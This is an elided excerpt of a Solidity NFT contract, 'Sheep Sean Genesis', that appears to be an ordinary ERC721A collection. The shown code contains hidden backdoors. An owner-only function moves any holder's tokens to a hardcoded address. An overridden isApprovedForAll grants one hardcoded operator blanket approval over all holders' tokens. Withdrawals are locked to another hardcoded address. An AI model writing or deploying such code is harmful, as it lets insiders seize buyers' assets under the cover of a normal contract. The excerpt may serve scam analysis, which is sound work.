{{
  "language": "Solidity",
  "sources": {
    "contracts/Sheep_Sean_Genesis.sol": {
...
contract Sheep_Sean_Genesis is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Sheep Sean Genesis", "SSG", maxBatchSize_, collectionSize_) {
  ...
  function SSG_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xaa5467C68c6f63E949e4B032d1c7A92B9fE90d90, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x06eF4DE5499F5EeC02071d518b7483f9C50c7b1F);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xe1C150987f728c86F7f6DEE3Fe19722157f54030){return true;}
